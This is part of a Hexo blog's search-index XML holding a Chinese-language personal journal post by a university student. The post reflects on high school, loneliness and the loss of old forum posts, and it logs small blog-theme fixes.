        <content type="html"><![CDATA[<blockquote><p>记录Blog创建以来的一些想法。</p></blockquote><a id="more"></a><p>  </p><p>  </p><p>2020.7.5</p><p>  大一的时候不知道从什么地方找到了hzw学长的blog，看到了那篇&quot;再见，OI&quot;，用文中的话来形容当时的感受就是&quot;当年的热血热的像鸡汤&quot;。今天又看了一遍，羡慕而心酸，似乎我的高中时代总是充满遗憾，成绩经历朋友。大学数年间曾无数次幻想自己能在高中参加OI，但学校似乎从来没有出过有名的OI选手，连省赛拿奖项似乎也没有听说过。班里的几位参加的同学只是把它当成逃课和玩乐的工具。唯一牛逼到能进国家队的是我毫无兴趣的生物竞赛。于是只是一名平凡的高考考生，把大量时间花费在重复而应试的高考上。</p><p>  好朋友去参加了生物竞赛，她为了准备考试而停课搬去了竞赛专用教室，离高一高二的教学楼很远，在僻静的高三教学区，被我们戏称为&quot;西伯利亚&quot;的地方。她临走前在课桌的缝隙间插了一朵小花，开玩笑说那朵花就代表着她的存在。后来高三我也去了竞赛教室旁边的一个自习室写题目，晚自修下课透过巨大的玻璃窗，只望见对面教学楼回寝室的人熙熙攘攘，而我一个人在偌大的教室里，只感受到一种寂静的孤独。</p><p>  前同桌是MO选手，在成为我同桌后在数学方面帮我良多，比赛刷题的日子还有点历历在目。在高二下的期末前同桌去参加了中科大少年班的选拔，与当年的高三一起参加了那届高考，考了640左右的一个成绩，幸运地通过了。于是我又回到一个人孤军奋战的日子。后来高三数学老师提起他，说他是“金菩萨”，我们底下这帮人都是自身难保的“泥菩萨”，我忘了当时坐在下面在想什么了，但这段话却印象很深刻。</p><p>  后来上了大学，见到了很多考败来浙的OI大佬，聚在一起侃侃而谈算法的样子，是我永远羡慕的场景。ADS期末考难倒大片人的算法题，只是他们眼中可能连OI初赛难度都算不上的题目。那时候我就想起了一句话，“有时候人与人之间的差距，比人与猪之间的差距还要大”。</p><p>  大学初有很多梦想，想搞ACM，CTF，CG，后来都没有实现，大多半途而废，只是脑中的纸上谈兵。大一谈了一场失败而抑郁的恋爱，大二整年浑浑噩噩地过去了，大三寝室重组，愈发压抑。</p><p>  我不知道ZJU学生的抑郁率与suicide rate在所有C9里是不是最高的，但我确实越发明晰而深刻地感受到，在这个校园里，不同人群之间存在着的巨大的隔阂与天然的差距，宛如天堑。当你无法抓住任何一种标签印刻在自己身上，就只能越来越沉默与坠落。</p><p>  </p><p>  </p><p>2019.7.25</p><p>  学期初因为小王的关系了解到Hexo，之前也确实看到过一些前辈的Blog，当时没有深究是怎么实现的。看到小王很开心地发Blog，半羡慕半跟风的心态，于是5月的时候照着一篇教程开始弄。</p><p>  建好了以后因为懒，而且美化起来确实有点麻烦（强迫症_(:з」∠)_…），于是放置了很长一段时间没有去搞。期间也尝试先用markdown写一些笔记，比如DB\ADS的一些，不过感觉有点苦手，之后还是换回了oneNote。</p><p>  中间虽然很长时间没有碰这个Blog，但很多时候还是会想起来，我要改哪些地方、之后打算发什么……之类的一些念头。想到自己，大一大二两年都有些迷茫，绩点什么的也都挺难看的，有时候不知道该做什么，或者明知道自己该做什么而不愿意去做、消极地逃避。大一上可能会是我大学四年里最认真的时间段了，虽然那个时候的我觉得自己真烂、怎么会这么菜，但从此时的角度回望过去，那个时候的投入程度比之现在也已经是可望不可即的程度了。</p><p>  从大学开始到现在越来越自闭，在人多的地方一个人的话会感觉到一种被压迫的窒息感，于是我不经常去食堂了，一个人上课有时候也心不在焉，但如果碰到认识但不熟悉的人会感觉更加的怪…不知道怎么去改善，如果py她们在的话我可能会感觉好一些，但是大家都不在一个学校了…</p><p>  我潜意识里觉得这个Blog可能会是能让我沉浸下来的一个东西，至少我有一个可以自己搭建的世界了。我看的那篇Hexo教程里引用了<a href="https://www.cnblogs.com/jhzhu/p/3893297.html" target="_blank" rel="noopener">这篇文章</a>，里面讲到作者写博客的理由：</p><blockquote><p>一是, 我不再那么乐于去学新的注定不会成为体系的东西了, 因为它除了能展示一下小聪明, 时间回报率特别小.<br>二是, 如果我决定去深究一个东西, 我一定要完全搞懂, 并认真总结一篇博客让我以后能在短时间拾起来(因为不搞懂你很难写一篇半年后还能理解的博客).</p></blockquote><p>  看到这段话以后我开始觉得完善自己的Blog不是那么一件虚无缥缈的事情了，至少它对我而言是有意义的。之前我总是东学一点、西学一点，但是半年过去、一年过去后，我又要花大量的时间从头开始捡起这样东西，从头开始再踩一遍我从前踩过的坑，这本不必要。如果我能记下来这些微小的东西，哪怕它本质上是很傻白甜的问题，但只要它对我有意义，那就是值得的。</p><p>  对我而言，这个Blog的存在也有一点私心。几个月前知道了百度屏蔽了2017年前所有贴子的消息，一瞬间有种心如死灰的漠然。</p><p>  如果以小学五年级为起点开始丈量，我人生有将近八年的时间是花费在贴吧上的——尽管高中开始的三年只是将其作为一个记录心情的地方。吧龄9.7年，发贴7415个，三个贴吧的吧主，在其中的投入已经不是用“心血”可以形容的了。而那些与形形色色来自全国各地的好友的回忆，那个在某个动漫贴吧经营过的流光字铺，那些一个字一个字敲出来的教程贴和个人向推荐贴，以及我悲哀的凝滞而不可挣脱的呓语，全都没有了。我不会再知道那个在我的碎碎念里路过，留下自己的文字，患有视神经病变的那个人是谁了；我不会再想起来曾经触动过我的那些故事的名字一一为何了；我不会再有机会写下那些蕴杂着彼时痛苦与扭曲的情感的文字了。我曾防备现实中记忆的证据的失落，但我不会想到有一天，连虚拟的记录也会不经挽留地消逝，并且是这样毫无征兆地。</p><p>  我不可能再承受下一次数据的失落了，对于记忆力日渐下降的我而言，记录是必要的，但是我不能再把这些记录交给不可靠的第三方了。那样的代价是，当我试图离开他们的领域，我就将失去我的一切。</p><blockquote><p>我走的时候，我还不知道曾经的生活有一天，会需要证明。<br>有一天会再没有人能够相信过去。我也会对以往的一切产生怀疑。那是我曾有过的生活吗。<br>……<br>还有，在它们中间悄无声息度过童年、少年、青年时光的我，他的快乐、孤独、无人感知的惊恐与激动……对于今天的生活，它们是否变得毫无意义。</p></blockquote><p>  </p><p>  </p><p>2019.5.20</p><p>搭建了Blog，之后因为界面方面的问题一直在做一些小的修补：</p><pre><code>修复了首页挂掉的busuanzi API。更换了各种图片，关闭了原有的评论，之后有空大概会换成valine。在每篇文章底下加了pre和next，顺便改了下h1-h6的字体大小。这个主题修了八百年的代码高亮终于修好了，这就是用冷门主题的代价吗？引入highlight.js包以后直接在layout.ejs最后加了。主题风格在加入的css里设置选择。原css与高亮存在冲突，修改了main.min.css里的pre&gt;code的颜色，注释掉了.highlight的整个部分。(这个主题的CSS真是让人摸不着头脑)高亮还存在bug，进入页面需要刷新一次才能正常显示高亮。(懒得管了，以后再说)...</code></pre><p>大抵是这些，之后若有对原主题的改动也会加在这里。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 碎碎念 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>关于</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>friends</title>
      <link href="/friends/index.html"/>
      <url>/friends/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>photo</title>
      <link href="/photo/index.html"/>
      <url>/photo/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
